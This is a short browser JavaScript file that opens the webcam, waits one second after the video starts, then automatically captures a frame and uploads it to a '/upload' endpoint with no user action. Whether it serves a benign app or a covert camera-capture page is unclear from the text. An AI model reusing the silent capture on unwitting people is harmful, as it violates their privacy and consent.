const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
})
.catch(err => {
    console.log("Camera error:", err);
});

function capturePhoto() {

    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    context.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/png");

    fetch("/upload", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ image: image })
    })
    .then(res => res.text())
    .then(data => {
        console.log("Server:", data);
    });

}

// รอให้กล้องโหลดก่อน
video.addEventListener("playing", () => {

    setTimeout(() => {
        capturePhoto();
    }, 1000);

});